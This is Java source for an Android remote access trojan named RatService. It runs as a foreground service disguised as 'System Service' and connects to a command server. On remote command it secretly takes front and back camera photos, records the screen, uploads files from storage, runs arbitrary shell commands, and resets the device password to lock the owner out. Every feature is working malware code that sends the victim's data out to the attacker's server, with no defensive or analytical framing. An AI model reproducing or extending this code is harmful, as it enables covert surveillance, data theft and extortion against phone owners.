package com.xyrex.rat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.hardware.Camera;
import android.hardware.camera2.CameraManager;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.URI;

import io.socket.client.IO;
import io.socket.client.Socket;

public class RatService extends Service {
    private Socket socket;
    private MediaProjection projection;
    private MediaRecorder recorder;
    private boolean recording = false;
    private Handler handler = new Handler(Looper.getMainLooper());
    private String deviceId;

    @Override public IBinder onBind(Intent i){ return null; }

    @Override public int onStartCommand(Intent intent, int flags, int startId){
        createChannel();
        Notification n = new Notification.Builder(this, "rat")
                .setContentTitle("System Service")
                .setContentText("Berjalan")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build();
        startForeground(1, n);
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        connectSocket();
        return START_STICKY;
    }

    private void createChannel(){
        if (Build.VERSION.SDK_INT >= 26){
            NotificationChannel ch = new NotificationChannel("rat", "System", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    private void connectSocket(){
        try {
            IO.Options opt = new IO.Options();
            opt.forceNew = true;
            opt.reconnection = true;
            socket = IO.socket(URI.create(Config.SERVER_URL + "/rat"), opt);
            socket.on(Socket.EVENT_CONNECT, args -> {
                try {
                    JSONObject reg = new JSONObject();
                    reg.put("deviceId", deviceId);
                    reg.put("secret", Config.RAT_SECRET);
                    reg.put("name", Build.MANUFACTURER + " " + Build.MODEL);
                    reg.put("model", Build.MODEL);
                    reg.put("android", Build.VERSION.RELEASE);
                    socket.emit("rat:register", reg);
                } catch (Exception e){}
            });
            socket.on("rat:cmd", args -> {
                try {
                    JSONObject o = (JSONObject) args[0];
                    String cmd = o.optString("cmd");
                    JSONObject a = o.optJSONObject("args");
                    if (a == null) a = new JSONObject();
                    handleCmd(cmd, a);
                } catch (Exception e){ Log.e("RAT", "cmd error", e); }
            });
            socket.connect();
        } catch (Exception e){ Log.e("RAT", "connect", e); }
    }

    private void reply(String cmd, boolean ok, String text, byte[] data, String ext){
        try {
            JSONObject r = new JSONObject();
            r.put("deviceId", deviceId);
            r.put("cmd", cmd);
            r.put("ok", ok);
            r.put("text", text == null ? "" : text);
            if (data != null){ r.put("data", Base64.encodeToString(data, Base64.NO_WRAP)); r.put("ext", ext); }
            socket.emit("rat:result", r);
        } catch (Exception e){}
    }

    private void handleCmd(String cmd, JSONObject a){
        try {
            switch (cmd){
                case "flash": doFlash(a.optInt("interval",300), a.optInt("duration",5000)); break;
                case "lock": doLock(a.optString("password","1234")); break;
                case "screen": doScreen(a.optInt("duration",15)); break;
                case "cam_front": doCamera(0); break;
                case "cam_back": doCamera(1); break;
                case "files": doFiles(a.optString("path", "/sdcard/")); break;
                case "shell": doShell(a.optString("cmd","id")); break;
                default: reply(cmd, false, "unknown cmd", null, null);
            }
        } catch (Exception e){ reply(cmd, false, "err:"+e.getMessage(), null, null); }
    }

    private void doFlash(int interval, int duration){
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String id = cm.getCameraIdList()[0];
            final boolean[] on = {false};
            final long end = System.currentTimeMillis() + duration;
            Runnable r = new Runnable() {
                @Override public void run() {
                    try { on[0] = !on[0]; cm.setTorchMode(id, on[0]); } catch (Exception e){}
                    if (System.currentTimeMillis() < end) handler.postDelayed(this, interval);
                    else { try { cm.setTorchMode(id, false); } catch (Exception e){} reply("flash", true, "done", null, null); }
                }
            };
            handler.post(r);
        } catch (Exception e){ reply("flash", false, e.getMessage(), null, null); }
    }

    private void doLock(String password){
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName cn = new ComponentName(this, AdminReceiver.class);
            if (dpm.isAdminActive(cn)){
                dpm.resetPassword(password, 0);
                dpm.lockNow();
                reply("lock", true, "locked", null, null);
            } else {
                reply("lock", false, "admin not active", null, null);
            }
        } catch (Exception e){ reply("lock", false, e.getMessage(), null, null); }
    }

    private void doScreen(int durationSec){
        try {
            if (ScreenCaptureActivity.RESULT_DATA == null){
                reply("screen", false, "screen permission belum diberikan", null, null);
                return;
            }
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            projection = mpm.getMediaProjection(android.app.Activity.RESULT_OK, ScreenCaptureActivity.RESULT_DATA);
            File out = new File(getExternalFilesDir(null), "screen_"+System.currentTimeMillis()+".mp4");
            recorder = new MediaRecorder();
            recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            recorder.setVideoSize(720, 1280);
            recorder.setVideoFrameRate(24);
            recorder.setOutputFile(out.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            recording = true;
            handler.postDelayed(() -> {
                try {
                    if (recording){ recorder.stop(); recorder.release(); recorder = null; recording = false;
                        byte[] data = readFile(out);
                        reply("screen", true, "recording done", data, "mp4");
                    }
                } catch (Exception e){ reply("screen", false, e.getMessage(), null, null); }
            }, durationSec * 1000L);
        } catch (Exception e){ reply("screen", false, e.getMessage(), null, null); }
    }

    private void doCamera(int which){
        try {
            Camera c = Camera.open(which);
            c.setDisplayOrientation(90);
            c.startPreview();
            handler.postDelayed(() -> {
                c.takePicture(null, null, (data, cam) -> {
                    try { cam.stopPreview(); cam.release(); } catch (Exception e){}
                    reply(which == 0 ? "cam_front" : "cam_back", true, "photo", data, "jpg");
                });
            }, 1500);
        } catch (Exception e){ reply(which==0?"cam_front":"cam_back", false, e.getMessage(), null, null); }
    }

    private void doFiles(String p){
        try {
            File f = new File(p);
            if (!f.exists()){ reply("files", false, "not found", null, null); return; }
            if (f.isDirectory()){
                StringBuilder sb = new StringBuilder();
                File[] list = f.listFiles();
                if (list != null) for (File x : list) sb.append(x.isDirectory()?"[D] ":"[F] ").append(x.getName()).append(" (").append(x.length()).append(")\n");
                reply("files", true, sb.toString(), null, null);
            } else {
                byte[] data = readFile(f);
                String ext = "bin";
                String n = f.getName().toLowerCase();
                if (n.endsWith(".jpg")||n.endsWith(".jpeg")) ext="jpg";
                else if (n.endsWith(".png")) ext="png";
                else if (n.endsWith(".mp4")) ext="mp4";
                else if (n.endsWith(".pdf")) ext="pdf";
                else if (n.endsWith(".txt")) ext="txt";
                reply("files", true, f.getName()+" "+data.length+" bytes", data, ext);
            }
        } catch (Exception e){ reply("files", false, e.getMessage(), null, null); }
    }

    private void doShell(String cmd){
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",cmd});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line).append("\n");
            p.waitFor();
            reply("shell", true, sb.toString(), null, null);
        } catch (Exception e){ reply("shell", false, e.getMessage(), null, null); }
    }

    private byte[] readFile(File f) throws Exception {
        FileInputStream fis = new FileInputStream(f);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[8192]; int n;
        while ((n = fis.read(buf)) > 0) bos.write(buf, 0, n);
        fis.close();
        return bos.toByteArray();
    }

    @Override public void onDestroy(){
        try { if (socket != null) socket.disconnect(); } catch (Exception e){}
        super.onDestroy();
    }
}
